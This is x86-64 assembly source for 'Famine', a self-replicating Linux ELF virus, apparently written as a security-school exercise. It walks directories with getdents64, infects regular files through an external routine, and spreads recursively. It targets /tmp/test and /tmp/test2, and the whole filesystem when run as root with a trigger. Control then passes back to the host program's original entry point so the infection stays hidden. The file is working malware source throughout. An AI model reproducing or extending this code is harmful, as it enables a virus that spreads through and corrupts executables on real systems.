;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; struct linux_dirent64 {													;
;	int64_t			d_ino;		// 64-bit inode number			| offset 0	;
;	int64_t			d_off;		// 64-bit offset to next struct	| offset 8	;
;	unsigned short	d_reclen;	// size of this dirent			| offset 16	;
;	unsigned char	d_type;		// File type					| offset 18	;
;	char			d_name[];	// file name					| offset 19	;
; }																			;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

%define STACK_SIZE	(4096 * 1024)

section .text
	global _start
	global _string
	global _read_dir
	global _ft_strlen
	global _verif
	extern _treat_file
	extern _final_end
	extern _thread_create
	extern _start_infect
	extern _infect_from_root

_o_entry:
	dq 0x0000000000000000 

_string:
	db 'Famine version 1.0 (c)oded by cdrouet-rludosan', 0

_start:
;	enter 16, 0
	push rbp
	mov rbp, rsp
	sub rsp, 16
;;;;;;;;;;;;;;;;;;;;;;
; save all registers ;
; to pop them in the ;
; same state before  ;
; we jmp on o_entry  ;
	push rbx ; +8
	push rcx ; +16
	push rdx ; +24
	push rsi ; +32
	push rdi ; +40
	push r8 ; +48
	push r9 ; +56
	push r10 ; +64
	push r11 ; +72
	push r12 ; +80
	push r13 ; +88
	push r14 ; +96
	push r15 ; +104
;;;;;;;;;;;;;;;;;;;;;
; To know if we need to execute the binary code, we pass a code in parameter.
; So we need to check parameters to know what to do
; Arguments can be on stack or on registers, depending of the compilator so:
	cmp QWORD [rsp + 128], 3 ; check if argc on the stack is equal 3
	je _alternative_start
_check_registers:
	cmp QWORD [rsp + 64], 3 ; check if argc on the registers is equal 3
	je _alternative_start_by_registers
    lea r10, [rel _o_entry]
    cmp QWORD [r10] , 0
    jne _test_root_infect
    call _start_infect
    jmp _continue_normaly

_test_root_infect:
    mov rdi, QWORD [rsp + 152]
    cmp rdi, 0
    je _continue_normaly
    mov rax, 0x4c4f4c3d54534554
    cmp QWORD [rdi], rax
    jne _continue_normaly
	mov rax, 107
	syscall ; We call geteuid
	cmp rax, 0 ; if geteuid return 0, so we are root, and we have largelly right to infect from /
	jne _continue_normaly
    call _infect_from_root

; If it's a normal execution, we just infect /tmp/test(2), to don't hard block the
; software with a too long execution.
_continue_normaly:
	mov rax, 0
	push rax
	push rax
;	lea r10, [rel _o_entry]
; Here we check if their is a o_entry address. If so, we are in an infected binary,
; so we just infect /tmp/test(2), and execute the code normally.
; Else, we test for the privilege we have, and try to infect from / if we can
;	cmp QWORD [r10], 0 ; compare _o_entry with 0
;	jne _infect_tmp_test
;	mov rax, 107
;	syscall ; We call geteuid
;	cmp rax, 0 ; if geteuid return 0, so we are root, and we have largelly right to infect from /
;	jne _infect_tmp_test
;	mov rax, 0
;	jmp _push_it
_infect_tmp_test: ; if geteuid don't returned 0, we can't know what right we have. So we just infect /tmp/test(2)
	mov rax, 0x747365742f706d74 ; tmp/test
;	mov rax, 0x006e69622f706d74 ; tmp/bin
_push_it:
	push rax
	mov rdi, rsp
	mov rsi, rsp
	add rsi, 16
	mov rax, 1 ; Here we said to our function: Go in recursive infect!
	push rax
	push rsi
	push rdi
	call _read_dir
;	cmp QWORD [rsp + 24], 0 ; if the path is empty, we infected from '/', so we don't need to reinfect
;	je _jmp_end
	mov BYTE [rsp + 32], 0x32 ; add the '2' at the end of the path string
	call _read_dir
_jmp_end:
; restore the stack
	pop rdi
	pop rdi
	pop rdi
	pop rdi
	pop rdi
	pop rdi
	lea rax, [rel _o_entry] ; mov in rax the o_entry address
	cmp QWORD [rax], 0 ; if this address is 0, so we are in famine exec, and we need to exit
	jne _jmp_to_o_entry
_force_exit:
	mov rdi, 0
	mov rax, 60 ; exit syscall number
	syscall

; In this alternative start, we know we have 3 arguments on the stacks, but we need to know
; if this is an infect only execution (we just run the infection, and then exit), of if we execute
; the binary after.
; To know why some times we need to execute the infection only, refer to the commentaries in fork.s
; On the stack, we have 8 bytes for argc, then 8 bytes per arguments (argv)
_alternative_start:
	mov r10, QWORD [rsp + 144] ; We take argv[1].
	lea r11, [rel _verif] ; relative address of _verif
	mov r11, QWORD [r11] ; dereferencing
	cmp QWORD [r10], r11 ; we compare the verify code, to know if it's a normal execution
	jne _check_registers
	mov rsi, QWORD [rsp + 152] ; take the argv[2]
	mov rax, 0 ; Here we said to our function: Do not infect in recursiv, only your directory
	push rax
	push rsi
	push rax
	call _read_dir
	pop rdi
	pop rdi
	pop rdi
	lea rax, [rel _force_exit] ; then exit
    jmp _jmp_to_o_entry

; In this other alternative start, the arguments are received by registers. We pushed the registers to
; don't corrupt the normal execution, so we will find our arguments on the stack.
_alternative_start_by_registers:
	mov r10, QWORD [rsp + 72] ; here we take argv
	mov r10, QWORD [r10 + 8] ; argv is an array, so we take the index 1 (argv[1]).
	lea r11, [rel _verif] ; relative address of _verif
	mov r11, QWORD [r11] ; dereferencing
	cmp QWORD [r10], r11 ; we compare the verify code, to know if it's a normal execution
	jne _continue_normaly
	mov rsi, QWORD [rsp + 72] ; take argv
	mov rsi, QWORD [rsi + 16] ; take argv[2]
	mov rax, 0 ; Here we said to our function: Do not infect in recursiv, only your directory
	push rax
	push rsi
	push rax
	call _read_dir
	pop rdi
	pop rdi
	pop rdi
	lea rax, [rel _force_exit] ; then exit

_jmp_to_o_entry:
; Restore the registers, to execute the binary like if we just never do enything on stack/registers
	pop r15
	pop r14
	pop r13
	pop r12
	pop r11
	pop r10
	pop r9
	pop r8
	pop rdi
	pop rsi
	pop rdx
	pop rcx
	pop rbx
	leave
	jmp [rax] ; jmp to o_entry

_ft_strlen: ; void ft_strlen(char *str)
	enter 16, 0
	xor rax, rax
	mov rbx, rdi
	cmp rdi, 0
	je _strlen_end
	mov rcx, -1
	cld
	repne scasb
	sub rdi, rbx
	mov rax, rdi
	sub rax, 1
_strlen_end:
	leave
	ret


; Here is our principal function:
; She will read the directory passed in parameter, and run infection in this directory.
; But the principe is a little bit more complexe:
; When this function find a binary in a directory, she infect this binary, and then exec it in a
; fork, with the _verif argument, if the bool recursif is set.
; If recursif is not set, it infect all binary in her given directory, and do not infect in
; recursif.
; So our main exec will run the recursif mode, infect only 1 binary per directory, et execute them.
; Then all the binary infected how will be executed will infect all binaries on their current directory.
_read_dir: ; void read_dir(bool recursif, char *actual_directory, char *path_of_dir)
	enter 392, 0
	; rsp + 0: dir struct
	; rsp + 280: virus size
	; rsp + 288: fd directory
	; rsp + 296: pointer to current dir file
	; rsp + 304: buffer end address
	; rsp + 312: address dir name 1arg
	; rsp + 320: size arg 1
	; rsp + 328: size arg 2
	; rsp + 336: total size
	; rsp + 344: 2 arg
	; rsp + 352: nb_thread launched
	; rsp + 360: bool, indicating if a binary have already been infected in the current directory
	; rsp + 368: bool, enable recursif
	; rsp - size: size of total path for this dir
	mov rdi, QWORD [rsp + 408]
	mov rsi, QWORD [rsp + 416]
	mov rax, QWORD [rsp + 424]
	mov QWORD [rsp + 368], rax
	mov QWORD [rsp + 312], rdi ; store first arg in stack
	mov QWORD [rsp + 344], rsi
	mov QWORD [rsp + 360], 0
	mov rdi, rsi ; calcul len of arg 2
	call _ft_strlen
	mov QWORD [rsp + 328], rax ; store arg2 len in stack
	mov rdi, QWORD [rsp + 312] ; take len of arg1
	call _ft_strlen
	mov QWORD [rsp + 320], rax ; store result in stack
	mov r10, QWORD [rsp + 320]
	mov QWORD [rsp + 336], r10
	mov r10, QWORD [rsp + 328]
	add QWORD [rsp + 336], r10
	add QWORD [rsp + 336], 2
	mov QWORD [rsp + 352], 0
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; we need a dynamic buffer to store our concatenation, but we can't touch rsp,
; to don't corrupt the datas offset is stack (if we sub 8 to rsp, rsp + 0 become rsp + 8)
; So we take rsp address, and write in the addresses under rsp.
; So the objectif is:
;
;	|	previous	|
;	|	function	|
;	|	stack frame	|
;	|	----------	|
;	|	rsp + 344	|
;	|	rsp + 336	|
;	|	   ...		|
;	|	rsp + 280	|
;	|	rsp + 0		|
;	|	----------	| < -- rsp is here, and we right under 	|
;	|		\0		|										|
;	|	actual dir	|										|
;	|		'/'		|										|
;	|	full path	|										|
;	|		dir		| <-------------------------------------|
;	|	----------	|
;
; But when we will need to call another function, the stack frame for the called function
; will probably be in our total path string, so we need to mov rsp on the full path string addr.
; To do this, here are the steps:
; mov r10, <memory addr of the total size of th full path string>
; sub rsp, r10
; sub rsp, 8	<---------| we sub rsp with a stack stored value, if we dont save this size in an easy addr
;							we will not be able to retrieve our stack, after the function call will be done.
;							So we take 8 Bytes to save our full path size in the top of the stack
; mov QWORD [rsp], r10
; add QWORD [rsp], 8	<-| 8 bytes for the size
; call <function>
; add rsp, QWORD [rsp]	<-| We pushed the full path size + 8 on stack, so now we just have to add it to rsp
;							to retrieve our stack frame
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; now we copy in our buffer: path_of_dir + '/' + actual_directory + '\0'
	mov rdi, rsp
	sub rdi, QWORD [rsp + 336]
	mov rsi, QWORD [rsp + 344]
	mov rcx, QWORD [rsp + 328]
	cld
	rep movsb
; add /
	mov rdi, rsp
	sub rdi, QWORD [rsp + 336]
	add rdi, QWORD [rsp + 328]
	mov BYTE [rdi], 0x2f ; '/'
; add arg1
	add rdi, 1
	mov rsi, QWORD [rsp + 312]
	mov rcx, QWORD [rsp + 320]
	cld
	rep movsb
; add \0
	mov rdi, rsp
	sub rdi, QWORD [rsp + 336]
	add rdi, QWORD [rsp + 328]
	add rdi, 1
	add rdi, QWORD [rsp + 320]
	mov BYTE [rdi], 0

_calculate_virus_size:
; virus_size = (&_final_end + 2) - &_string
	xor r10, r10 ; r10 = 0
	lea r10, [rel _final_end] ; r10 = &_final_end
	add r10, 2 ; final_end have 2 bytes of instrucitions
	xor r11, r11
	lea r11, [rel _string] ; r11 = &_string
	sub r10, r11 ; &_final_end -= &_string
	mov QWORD [rsp + 280], r10 ; virus size = r10

_open_dir:
	mov rdi, rsp
	mov r10, QWORD [rsp + 336]
	sub rdi, r10
	xor rsi, rsi ; rsi = 0, RD_ONLY
	xor rdx, rdx ; rdx = 0, flag unused
	mov rax, 0x2 ; open syscall number
	mov r10, QWORD [rsp + 336]
	sub rsp, r10
	sub rsp, 8
	mov QWORD [rsp], r10
	add QWORD [rsp], 8
	syscall ; open
	add rsp, QWORD [rsp]
	cmp rax, -1 ; if open return something under or equal of -1, jump to end
	jle _close_dir
	mov QWORD [rsp + 288], rax ; fd directory = return of open (fd)

_file_loop:
; call getdents64
	mov rdx, 280 ; this is the size of our buffer
	mov rdi, QWORD [rsp + 288] ; mov the fd to the first argument
	mov rsi, rsp ; mov the stack pointer to the second argument
	mov rax, 217 ; getdents64 syscall number
	mov r10, QWORD [rsp + 336]
	sub rsp, r10
	sub rsp, 8
	mov QWORD [rsp], r10
	add QWORD [rsp], 8
	syscall
	add rsp, QWORD [rsp]
; check getdents64 return
	cmp rax, 0 ; we check if getdents64 read something, if not, we are at the end of dir or their is an error
	jle _close_dir
; set the theoric maximum address for the readed datas in our buffer
	mov r10, rax ; mov to r10 the number of bytes readed
	add r10, rsp ; set the maximum theoric address for the readed datas (start buffer address + number of bytes read)
	mov QWORD [rsp + 304], r10
	mov rsi, rsp ; initialize rsi with our buffer address on the stack
	mov QWORD [rsp + 296], rsi

_read_data:
; check if we are too far in memory
	mov r10, QWORD [rsp + 304]
	cmp QWORD [rsp + 296], r10 ; r10 is the address of the end of the buffer, so we check if our address is too far in memory
	jge _file_loop ; and we jump to read again the dir datas, to see if their is anothers datas to treat
; offset 18 is the file type. We check if it's a directory
	xor r12, r12 ; r12 = 0
	mov r12b, BYTE [rsi + 18]
	cmp r12, 4
	je _test_bool ;_recursiv_infect
; offset 18 is the file type. We check if it's a regular file
	xor r12, r12 ; r12 = 0
	mov r12b, BYTE [rsi + 18] 
	cmp r12, 8
	jne _continue ; if it's not a regular file, just continue
	cmp QWORD [rsp + 368], 1
	jne _treat_normally ; check if we already infected a binary. if so, we need to know if we need to infect the others binaries
	cmp QWORD [rsp + 360], 1
	je _continue ; check if we need to infect all binaries. We the recursif is not set, we infect all binaries
; now we call _treat_file, with our current file.
_treat_normally:
	add rsi, 19 ; in the dirent struct, the name of te file is at offset 19
	mov rdi, rsi
	mov rsi, QWORD [rsp + 280]
	mov r10, QWORD [rsp + 336]
	mov rdx, rsp
	sub rdx, r10
	sub rsp, r10
	sub rsp, 8
	mov QWORD [rsp], r10
	add QWORD [rsp], 8
	mov r11, rsp
	add r11, QWORD [r11]
	mov r10, 0
	cmp QWORD [r11 + 368], 1
	jne _call_treat_file
	mov r10, 1
_call_treat_file:
	call _treat_file
	add rsp, QWORD [rsp]
	cmp rax, 0
	je _continue
; reinit rsi for next loop
	mov QWORD [rsp + 360], 1
	jmp _continue

_test_bool:
	cmp QWORD [rsp + 368], 1 ; check if we need to infect in recursiv
	jne _continue

_recursiv_infect:
	mov rsi, QWORD [rsp + 296]
	add rsi, 19
	cmp WORD [rsi], 0x002e
	je _continue
	cmp WORD [rsi], 0x002e2e
	je _continue

	mov rdi, QWORD [rsp + 296]
	add rdi, 19
	mov rsi, rsp
	mov r10, QWORD [rsp + 336] 
	sub rsi, r10
	sub rsp, r10
	sub rsp, 8
	mov QWORD [rsp], r10
	add QWORD [rsp], 8
	mov rax, 1 ; continue to infect in recursiv mode
	push rax
	push rsi
	push rdi
	call _read_dir
	pop rdi
	pop rdi
	pop rdi
	add rsp, QWORD [rsp]
	jmp _continue
_update_rsp:
	inc QWORD [rsp + 352]

_continue:
; reinit/increment registers/stack variable for next loop
	mov rsi, [rsp + 296]
	xor r11, r11 ; clear r11
	mov r11w, WORD [rsi + 16] ; in dirent struct, at offset 16, their is a short (2 bytes) describing the len of the file
	add rsi, r11 ; we add this len on our current struct address to access next struct
	mov QWORD [rsp + 296], rsi
	jmp _read_data

_close_dir:
; Close directory
	mov rax, 3
	mov rdi, QWORD [rsp + 288]
	syscall

_end_ret:
	leave
	ret

; Here is our verif code
_verif:
	dq 0x1122334455667788
	db 0
